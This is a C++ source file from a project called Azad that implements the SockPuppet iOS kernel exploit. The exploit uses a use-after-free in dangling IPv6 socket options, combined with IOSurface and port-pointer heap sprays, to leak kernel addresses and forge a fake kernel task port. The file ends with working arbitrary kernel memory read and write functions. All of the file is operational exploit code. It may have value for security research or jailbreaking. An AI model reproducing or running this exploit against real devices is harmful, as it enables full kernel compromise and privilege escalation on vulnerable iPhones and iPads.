//
//  SockPuppet.cpp
//  Azad
//
//  Created by Umang Raghuvanshi on 02/08/19.
//  Copyright © 2019 Umang Raghuvanshi. All rights reserved.
//

#include "SockPuppet.hpp"

#define IPV6_USE_MIN_MTU 42
#define IPV6_PKTINFO 46
#define IPV6_PREFER_TEMPADDR 63
#define MAX_ATTEMPTS 50000

extern "C" {
#include "KernelUtilities.h"
#include "iosurface.h"
#include "parameters.h"
#include <common.h>
#include <unistd.h>
}

using namespace Azad;
using namespace Azad::Exploits;

// MARK: UAF helpers

static void setMinmtu(int sock, int* minmtu)
{
    if (setsockopt(sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu,
            sizeof(*minmtu))
        != 0)
        throw std::runtime_error("setsockopt failed");
}
static int getMinmtu(int sock)
{
    int minmtu;
    socklen_t sz = sizeof(minmtu);
    if (getsockopt(sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, &minmtu, &sz) != 0)
        throw std::runtime_error("getsockopt failed");

    return minmtu;
}
static int getPrefertempaddr(int sock)
{
    int prefertempaddr;
    socklen_t sz = sizeof(prefertempaddr);
    if (getsockopt(sock, IPPROTO_IPV6, IPV6_PREFER_TEMPADDR, &prefertempaddr,
            &sz)
        != 0)
        throw std::runtime_error("getsockopt failed");

    return prefertempaddr;
}
static std::vector<uint8_t> getPktLOG(int socket)
{
    auto buf = std::vector<uint8_t>(sizeof(in6_pktinfo));
    socklen_t sz = sizeof(in6_pktinfo);

    if (getsockopt(socket, IPPROTO_IPV6, IPV6_PKTINFO, buf.data(), &sz) != 0)
        throw std::runtime_error("getsockopt failed");

    return buf;
}
static void setPktLOG(int sock, void* pktinfo)
{
    if (setsockopt(sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo,
            sizeof(struct in6_pktinfo))
        != 0)
        throw std::runtime_error("setsockopt failed");
}
static int getSocket()
{
    // Create the socket we'll use for the UAF.
    int socketWithDanglingOptions = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
    if (socketWithDanglingOptions < 0)
        throw std::runtime_error("Failed to create a socket");

    // Allow setting options even socket is closed.
    struct so_np_extensions sonpx = { .npx_flags = SONPX_SETOPTSHUT,
        .npx_mask = SONPX_SETOPTSHUT };
    if (setsockopt(socketWithDanglingOptions, SOL_SOCKET, SO_NP_EXTENSIONS,
            &sonpx, sizeof(sonpx))
        != 0)
        throw std::runtime_error("Failed to set SO_NP_EXTENSIONS");

    return socketWithDanglingOptions;
}
static void dangleOptions(int socket)
{
    int minmtu = -1;
    setMinmtu(socket, &minmtu);
    if (disconnectx(socket, 0, 0) != 0)
        throw std::runtime_error("disconnectx failed");
}
static inline uint32_t mach_port_waitq_flags()
{
    union waitq_flags waitq_flags = {};
    waitq_flags.waitq_type = WQT_QUEUE;
    waitq_flags.waitq_fifo = 1;
    waitq_flags.waitq_prepost = 0;
    waitq_flags.waitq_irq = 0;
    waitq_flags.waitq_isvalid = 1;
    waitq_flags.waitq_turnstile_or_port = 1;
    return waitq_flags.flags;
}

uint64_t SockPuppet::leakPipeBufferAddress(int fd, uint64_t* bufferptr)
{
    auto const proc = earlyRead64(
        currentTaskAddr + OFFSET(task, bsd_info));

    auto const fds = earlyRead64(proc + OFFSET(proc, p_fd));
    auto const ofiles = earlyRead64(fds + OFFSET(filedesc, fd_ofiles));
    auto const fproc = earlyRead64(ofiles + fd * 8);
    auto const fglob = earlyRead64(fproc + OFFSET(fileproc, f_fglob));
    auto const fgdata = earlyRead64(fglob + OFFSET(fileglob, fg_data));
    if (bufferptr)
        *bufferptr = fgdata + OFFSET(pipe, pipe_buffer);

    return earlyRead64(fgdata + OFFSET(pipe, pipe_buffer));
}

uint64_t SockPuppet::leakPortAddress(mach_port_t portname)
{
    int socketForLeak = getSocket();
    dangleOptions(socketForLeak);

    for (int i = 0; i < MAX_ATTEMPTS; i++) {
        // Options are 192 bytes long, so we must spray 192/sizeof(ptr) pointers to
        // the current port.
        mach_port_t holder = Utility::sprayPortPointer(
            portname, 192 / sizeof(size_t), MACH_MSG_TYPE_COPY_SEND);
        const int mtu = getMinmtu(socketForLeak);
        const int preferTempAddr = getPrefertempaddr(socketForLeak);

        if (mtu < 0xffffff00 || mtu == 0xffffffff || preferTempAddr == 0xdeadbeef) {
            mach_port_destroy(mach_task_self(), holder);
            continue;
        }

        uint64_t ptr = (((uint64_t)mtu << 32) & 0xffffffff00000000) | ((uint64_t)preferTempAddr & 0x00000000ffffffff);

        mach_port_destroy(mach_task_self(), holder);
        close(socketForLeak);
        return ptr;
    }
    throw std::runtime_error("Failed to leak port address");
}

std::vector<uint8_t> SockPuppet::leak20AndFree(uint64_t address, bool free)
{
    int targetSocketFD = -1;
    // Create a bunch of sockets with dangling options.
    std::vector<int> socketsWithDanglingOptions(128);
    for (int i = 0; i < 128; i++)
        socketsWithDanglingOptions[i] = getSocket();

    struct ip6_pktopts fakeOptions = { 0 };
    fakeOptions.ip6po_minmtu = 0xfadef00d;
    fakeOptions.ip6po_pktinfo = (struct in6_pktinfo*)address;

    for (auto& s : socketsWithDanglingOptions)
        dangleOptions(s);
    while (true) {
        IOSurface_init();
        bool found = false;
        if (IOSurface_spray_with_gc(32, 256, &fakeOptions, sizeof(fakeOptions),
                NULL)
            != true)
            throw std::runtime_error("IOSurface spray failed");

        int i = 0;
        for (auto& s : socketsWithDanglingOptions) {
            if (getMinmtu(s) == 0xfadef00d) {
                targetSocketFD = s;
                found = true;
                break;
            }
            i++;
        }
        IOSurface_deinit();
        if (found)
            break;
    }

    auto buf = getPktLOG(targetSocketFD);
    if (free) {
        in6_pktinfo nullPktInfo = { 0 };
        setPktLOG(targetSocketFD, &nullPktInfo);
    }
    for (auto& s : socketsWithDanglingOptions)
        close(s);

    return buf;
}

uint64_t SockPuppet::earlyRead64(uint64_t address)
{
    auto buf = leak20AndFree(address);
    auto u64 = *(uint64_t*)buf.data();
    return u64;
}

static inline uint32_t stage1Read32(int fakePortPipes[2], mach_port_t fakeTask,
    uint64_t addr)
{
    uint8_t buffer[sizeof(kport_t) + sizeof(ktask_t)];
    if (read(fakePortPipes[0], buffer, sizeof(buffer)) != sizeof(buffer))
        throw std::runtime_error("Pipe read failed");

    *(uint64_t*)((uint64_t)buffer + sizeof(kport_t) + OFFSET(task, bsd_info)) = addr - OFFSET(proc, p_pid);

    if (write(fakePortPipes[1], buffer, sizeof(buffer)) != sizeof(buffer))
        throw std::runtime_error("Pipe buffer write failure");

    int pid;
    pid_for_task(fakeTask, &pid);
    return pid;
}

static inline uint64_t stage1Read64(int fakePortPipes[2], mach_port_t fakeTask,
    uint64_t addr)
{
    uint64_t high = stage1Read32(fakePortPipes, fakeTask, addr + 0x4);
    uint32_t low = stage1Read32(fakePortPipes, fakeTask, addr);
    return (high << 32) | low;
}

static inline uint64_t rk64(task_t vmMap, uint64_t addr)
{
    uint64_t data, size;
    if (mach_vm_read_overwrite(
            vmMap, (mach_vm_address_t)addr, (mach_vm_size_t)sizeof(data),
            (mach_vm_address_t)&data, (mach_vm_size_t*)&size)
            != KERN_SUCCESS
        || size != sizeof(data))
        throw std::runtime_error("read64 failed");
    return data;
}

static inline void wk64(task_t vmMap, uint64_t addr, uint64_t val)
{
    if ((mach_vm_write(vmMap, (mach_vm_address_t)addr, (vm_offset_t)&val, 8)) != KERN_SUCCESS)
        throw std::runtime_error("write64 failed");
}

static inline void wk32(task_t vmMap, uint64_t addr, uint32_t val)
{
    if ((mach_vm_write(vmMap, (mach_vm_address_t)addr, (vm_offset_t)&val, 4)) != KERN_SUCCESS)
        throw std::runtime_error("write32 failed");
}

static inline uint64_t lookupPort(task_t vmMap, uint64_t currentTask,
    mach_port_t target,
    bool null = false)
{
    const uint64_t itkSpace = rk64(vmMap, currentTask + OFFSET(task, itk_space));
    const uint64_t isTable = rk64(vmMap, itkSpace + OFFSET(ipc_space, is_table));
    const uint32_t idx = target >> 8;
    const uint32_t size = 0x18;
    const uint64_t portAddr = rk64(vmMap, isTable + (idx * size));

    if (null) {
        wk64(vmMap, isTable + (idx * size), 0);
        wk32(vmMap, isTable + (idx * size) + 8, 0);
    }

    return portAddr;
}

SockPuppet::SockPuppet()
{
    // Create the socket we'll use for the UAF.
    socketWithDanglingOptions = getSocket();
}

bool SockPuppet::run()
{
    LOG("Running the SockPuppet exploit");

    uint64_t ownTaskPortKaddr = leakPortAddress(mach_task_self());
    currentTaskAddr = earlyRead64(
        ownTaskPortKaddr + OFFSET(ipc_port, ip_kobject));
    LOG("Current task: %p", currentTaskAddr);
    uint64_t ipcSpaceKernel = earlyRead64(ownTaskPortKaddr + OFFSET(ipc_port, ip_receiver));
    LOG("Kernel's IPC space: %p", ipcSpaceKernel);

    if (pipe(portPointerOverwritePipes) != KERN_SUCCESS || pipe(fakePortPipes))
        throw std::runtime_error("Failed to create pipes");

    uint8_t pipebuf[0x10000] = { 0 };
    // Force allocation.
    write(portPointerOverwritePipes[1], pipebuf, sizeof(pipebuf));
    // Reset the pipe's position.
    read(portPointerOverwritePipes[0], pipebuf, sizeof(pipebuf));
    write(portPointerOverwritePipes[1], pipebuf, 8);

    auto const fakeSize = sizeof(kport_t) + sizeof(ktask_t);
    auto fakePort = (kport_t*)calloc(1, fakeSize);
    auto fakeTask = (ktask_t*)((uint8_t*)fakePort + sizeof(kport_t));

    fakeTask->ref_count = 0xff;

    fakePort->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
    fakePort->ip_references = 0xf00d;
    fakePort->ip_lock.type = 0x11;
    fakePort->ip_messages.port.receiver_name = 1;
    fakePort->ip_messages.port.msgcount = 0;
    fakePort->ip_messages.port.qlimit = MACH_PORT_QLIMIT_LARGE;
    fakePort->ip_messages.port.waitq.flags = mach_port_waitq_flags();
    fakePort->ip_srights = 99;
    fakePort->ip_receiver = ipcSpaceKernel;

    write(fakePortPipes[1], (void*)fakePort, fakeSize);
    read(fakePortPipes[0], (void*)fakePort, fakeSize);
    uint64_t pipePtr;

    uint64_t portPointerOverwritePipeKaddr = leakPipeBufferAddress(portPointerOverwritePipes[0], &pipePtr);
    uint64_t fakePortBufferKaddr = leakPipeBufferAddress(fakePortPipes[0]);

    LOG("Pipe buffer %i: %p", portPointerOverwritePipes[0],
        portPointerOverwritePipeKaddr);
    LOG("Pipe buffer %i: %p", fakePortPipes[0], fakePortBufferKaddr);

    // Fix ip_kobject.
    fakePort->ip_kobject = fakePortBufferKaddr + sizeof(kport_t);
    write(fakePortPipes[1], (void*)fakePort, fakeSize);

    mach_port_t dummyKernelTaskPort = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE,
        &dummyKernelTaskPort);
    if (!MACH_PORT_VALID(dummyKernelTaskPort) || mach_port_insert_right(mach_task_self(), dummyKernelTaskPort, dummyKernelTaskPort, MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS)
        throw std::runtime_error("tfp0 allocation failed");
    const uint64_t tfp0Kaddr = leakPortAddress(dummyKernelTaskPort);
    LOG("Dummy kernel task port: %p", tfp0Kaddr);

    // Free the first pipe.
    leak20AndFree(portPointerOverwritePipeKaddr, true);
    mach_port_t holder = MACH_PORT_NULL;
    uint64_t leak = 0;
    for (int i = 0; i < MAX_ATTEMPTS; i++) {
        // Spray 0x10000/8 port pointers so that they get reallocated in place of
        // the first pipe.
        holder = Utility::sprayPortPointer(dummyKernelTaskPort, 0x10000 / 8,
            MACH_MSG_TYPE_COPY_SEND);
        read(portPointerOverwritePipes[0], &leak, sizeof(leak));
        write(portPointerOverwritePipes[1], &leak, sizeof(leak));

        if (leak == tfp0Kaddr)
            break;
        mach_port_destroy(mach_task_self(), holder);
    }
    if (leak != tfp0Kaddr)
        throw std::runtime_error("Failed to reallocate");

    write(portPointerOverwritePipes[1], &fakePortBufferKaddr, 8);
    LOG("Port pointer overwritten");

    auto fakePortSendRightMsg = (struct ool_msg*)calloc(1, 0x1000);
    const kern_return_t didRecv = mach_msg(&fakePortSendRightMsg->hdr, MACH_RCV_MSG, 0, 0x1000, holder,
        MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (didRecv != KERN_SUCCESS)
        throw std::runtime_error("Failed to recieve send rights to fake port");

    mach_port_t pipeFakeKernelTaskPort = ((mach_port_t*)fakePortSendRightMsg->ool_ports.address)[1];
    if (!MACH_PORT_VALID(pipeFakeKernelTaskPort) || pipeFakeKernelTaskPort == dummyKernelTaskPort)
        throw std::runtime_error("Fake kernel task port is invalid");
    free(fakePortSendRightMsg);

    uint64_t structTask = stage1Read64(
        fakePortPipes, pipeFakeKernelTaskPort,
        ownTaskPortKaddr + OFFSET(ipc_port, ip_kobject));
    if (structTask != currentTaskAddr)
        throw std::runtime_error("Stage 1 read64 failed");
    LOG("Stage 1 read64 succeeded");

    uint64_t kernelVMMap = 0;
    while (structTask) {
        uint64_t bsdInfo = stage1Read64(
            fakePortPipes, pipeFakeKernelTaskPort,
            structTask + OFFSET(task, bsd_info));
        if (!bsdInfo)
            throw std::runtime_error("Stage 1 read64 failed");

        uint32_t pid = stage1Read32(
            fakePortPipes, pipeFakeKernelTaskPort,
            bsdInfo + OFFSET(proc, p_pid));
        if (pid == 0) {
            kernelVMMap = stage1Read64(fakePortPipes, pipeFakeKernelTaskPort,
                structTask + 0x20);
            if (!kernelVMMap)
                throw std::runtime_error("Stage 1 read64 failed");
            break;
        } else if (pid == getpid()) {
            cached_proc_struct_addr = bsdInfo;
        }
        structTask = stage1Read64(fakePortPipes, pipeFakeKernelTaskPort,
            structTask + 0x30);
    }
    if (!kernelVMMap)
        throw std::runtime_error("Failed to find kernel's VM map");
    LOG("Kernel VM map: %p", kernelVMMap);

    read(fakePortPipes[0], (void*)fakePort, fakeSize);
    fakeTask->lock.data = 0;
    fakeTask->lock.type = 0x22;
    fakeTask->ref_count = 0xff;
    fakeTask->active = 1;
    fakeTask->map = kernelVMMap;
    *(uint32_t*)((uint64_t)fakeTask + 0xd8) = 1;
    write(fakePortPipes[1], (void*)fakePort, fakeSize);

    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE,
        &kernelTaskPort);
    if (!MACH_PORT_VALID(kernelTaskPort) || mach_port_insert_right(mach_task_self(), kernelTaskPort, kernelTaskPort, MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS)
        throw std::runtime_error("tfp0 allocation failed");

    uint64_t stableFakeTask;
    if (mach_vm_allocate(pipeFakeKernelTaskPort, &stableFakeTask, sizeof(ktask_t),
            VM_FLAGS_ANYWHERE)
        != KERN_SUCCESS)
        throw std::runtime_error("Failed to allocate memory for the fake task");
    if (mach_vm_write(pipeFakeKernelTaskPort, stableFakeTask,
            (vm_offset_t)fakeTask, sizeof(ktask_t))
        != KERN_SUCCESS)
        throw std::runtime_error("Failed to write fake task to kernel memory");

    const uint64_t kernelTaskPortKaddr = lookupPort(
        pipeFakeKernelTaskPort, currentTaskAddr, kernelTaskPort);
    LOG("Stable kernel task port %i: %p", kernelTaskPort, kernelTaskPortKaddr);
    fakePort->ip_kobject = stableFakeTask;
    if (mach_vm_write(pipeFakeKernelTaskPort, kernelTaskPortKaddr,
            (vm_offset_t)fakePort, sizeof(kport_t))
        != KERN_SUCCESS)
        throw std::runtime_error(
            "Failed to write fake kernel task port to kernel memory");

    uint64_t testAllocKaddr;
    if (mach_vm_allocate(kernelTaskPort, &testAllocKaddr, 8, VM_FLAGS_ANYWHERE) != KERN_SUCCESS)
        throw std::runtime_error("Stable task port isn't working");
    mach_vm_deallocate(kernelTaskPort, testAllocKaddr, 8);

    LOG("Exploit succeeded, cleaning up");
    lookupPort(kernelTaskPort, currentTaskAddr, pipeFakeKernelTaskPort, true);
    wk64(kernelTaskPort, pipePtr, 0);

    close(fakePortPipes[0]);
    close(fakePortPipes[1]);
    close(portPointerOverwritePipes[0]);
    close(portPointerOverwritePipes[1]);

    free((void*)fakePort);
    LOG("Cleanup done");
    return true;
}

size_t SockPuppet::readKernelMemory(uint64_t address, uint8_t* buffer,
    size_t bufferSize)
{
    mach_vm_size_t numRead;
    const kern_return_t didRead = mach_vm_read_overwrite(
        kernelTaskPort, address, bufferSize, (vm_address_t)buffer, &numRead);
    if (didRead != KERN_SUCCESS)
        throw std::runtime_error("Failed to read kernel memory");

    return numRead;
}

size_t SockPuppet::writeKernelMemory(uint64_t address, uint8_t* data,
    size_t dataSize)
{
    auto const toWrite = static_cast<mach_msg_type_number_t>(dataSize);
    const kern_return_t didWrite = mach_vm_write(kernelTaskPort, address, (vm_offset_t)data, toWrite);
    if (didWrite != KERN_SUCCESS)
        throw std::runtime_error("Failed to write kernel memory");

    return toWrite;
}

mach_port_t SockPuppet::getFakeKernelTaskPort() { return kernelTaskPort; }
